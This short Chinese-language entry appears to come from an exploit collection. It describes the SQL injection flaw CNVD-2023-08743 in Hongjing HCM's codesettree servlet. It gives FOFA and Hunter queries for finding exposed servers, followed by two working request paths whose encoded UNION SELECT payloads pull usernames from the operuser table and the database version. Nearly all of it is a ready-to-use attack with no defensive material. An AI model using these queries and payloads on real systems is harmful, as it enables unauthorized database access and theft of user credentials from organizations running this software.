# 宏景 HCM codesettree SQL注入漏洞 CNVD-2023-08743

## 网络测绘

fofa: app="HJSOFT-HCM"

hunter: app.name="宏景 HCM"

## POC / EXP

```
/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d

/servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d&codesetid=1&flag=c&parentid=-1&status=1
```